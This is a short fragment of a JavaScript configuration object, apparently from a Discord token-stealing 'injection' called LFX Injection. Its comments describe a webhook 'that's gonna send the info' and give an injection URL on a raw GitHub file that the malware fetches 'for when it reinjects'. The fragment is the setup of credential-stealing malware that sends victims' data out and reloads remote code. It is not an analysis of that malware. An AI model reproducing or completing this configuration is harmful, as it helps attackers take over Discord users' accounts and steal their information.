...
const config = {
  ...
  embed_name: 'LFX Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1073936833840431105/1081353980514422825/standard.gif'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/KanekiFR/LFX-Injections/main/injection.js', //injection url for when it reinjects
  /**
